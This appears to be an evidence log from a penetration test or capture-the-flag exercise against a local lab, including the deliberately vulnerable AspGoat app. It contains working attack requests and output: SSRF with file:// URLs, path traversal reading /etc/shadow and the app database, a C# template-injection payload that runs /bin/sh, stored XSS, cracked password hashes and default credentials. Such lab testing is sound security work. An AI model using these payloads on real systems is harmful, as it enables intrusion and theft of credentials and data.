# Discovery Phase Evidence Log
## Target Scope: Local Testing Environment (127.0.0.1)

### 1. Asset Map
| Port | Service | Tech Stack | Status |
|------|---------|-----------|--------|
| 80 | Apache 2.4.58 (Ubuntu) | Static directory listing | Empty index |
| 8000 | Aegis-IoA X v3.0.0-industrial | FastAPI/uvicorn (Python) | Production API - UNAUTHENTICATED |
| 8090 | AspGoat (OWASP) | ASP.NET Core / Kestrel | Intentionally vulnerable app |

### 2. Aegis-IoA X API (Port 8000) - Key Endpoints

#### 2.1 System Config (Unauthenticated)
```
GET /api/system/config
Response:
{
  "app_name":"Aegis-IoA X",
  "app_version":"3.0.0-industrial",
  "environment":"local",
  "log_level":"INFO",
  "enable_rate_limit":false,
  "real_sdn_enabled":false
}
```

#### 2.2 Model Registry - SSRF Vulnerability (CRITICAL)
```
POST /api/models/register
Body: {"model_id":"ssrf-file-read-test","provider":"openai","endpoint":"file:///etc/passwd",...}
Response: {"model_id":"ssrf-file-read-test","endpoint":"file:///etc/passwd",...}
```
- 8+ existing models with `file:///etc/passwd` endpoints already registered
- Model IDs: recon-test-ax5n-ssrf, recon-test-evil-001, attacker-test-001, discoverer-attacker, recon-test-evil-8rn6, ssrf-probe-001, ssrf-test

#### 2.3 Credential Leak in Model Endpoint (CRITICAL)
```
GET /api/models
Model "creds-leak-1": endpoint = "http://sk-abc123SECRETLEAK@127.0.0.1:8000/api/system/config"
```
- API key `sk-abc123SECRETLEAK` embedded in URL

#### 2.4 Full Network Topology Exposed (HIGH)
```
GET /api/overview
12 modules exposed
GET /api/agents - 15 agents with trust levels, capabilities, MCP tools
GET /api/models - 35 model configurations with internal endpoints
```

### 3. AspGoat (Port 8090) - Vulnerability Findings

#### 3.1 LFI Path Traversal (CRITICAL)
```
GET /Home/Download?file=../../../../etc/passwd
Response: root:x:0:0:root:/root:/bin/bash ... app:x:1654:1654::/home/app:/bin/sh

GET /Home/Download?file=../../../../etc/shadow
Response: root:*:20689:0:99999:7::: ... app:!:20690:0:99999:7:::

GET /Home/Download?file=../../../../app/appsettings.json
Response: {"ConnectionStrings":{"DefaultConnection":"Data Source=Database/app.db"},"aiModel":"tinyllama:1.1b-chat"}
```

#### 3.2 Full SQLite Database Exfiltration (CRITICAL)
```
GET /Home/Download?file=../../../../app/Database/app.db
Response: SQLite 3.x database (20480 bytes)
```

**Users table:**
| UserName | PasswordHash (MD5) | Role |
|----------|-------------|------|
| test | 5f4dcc3b5aa765d61d8327deb882cf99 = "password" | user |
| admin | C# SSTI/RCE PAYLOAD IN USERNAME FIELD | admin |
| guest | 084e0343a0486ff05530df6c705c8bb4 = "guest" | user |

**Admin username RCE payload:**
```csharp
@using System.Diagnostics@{var p=new Process();p.StartInfo=new ProcessStartInfo("/bin/sh","-c \"grep -rli flag{ /root /app /home /etc 2>/dev/null\""){...};p.Start();@p.StandardOutput.ReadToEnd()}
```
This payload attempts to grep filesystem for `flag{` pattern.

**Comments:** `<script>document.title="PWNED"</script>` (Stored XSS)
**EmailIds:** `csrftest@evil.com`

#### 3.3 Default Credentials
- admin/admin123 (working on AspGoat login)

### 4. Refuted Directions
| Endpoint | Status |
|----------|--------|
| /robots.txt (8000) | 404 |
| /robots.txt (8090) | Empty |
| /admin (8090) | 404 |
| /secret.key (8090) | 404 |
| /console (8090) | 404 |
| /flag.txt (8090) | 404 |
| /backup.zip (8090) | 404 |
| Path traversal (8000) | 404 |

### 5. Network Topology (15 nodes, 17 edges)
```
h1(teaching) → s1(access) → fw1(security) → s3(core) → h4(dc)
h2(dorm) → s1, h3(lab) → s2(aggregation), s4(edge), edge1, dmz1, cloud1, cloud2
```
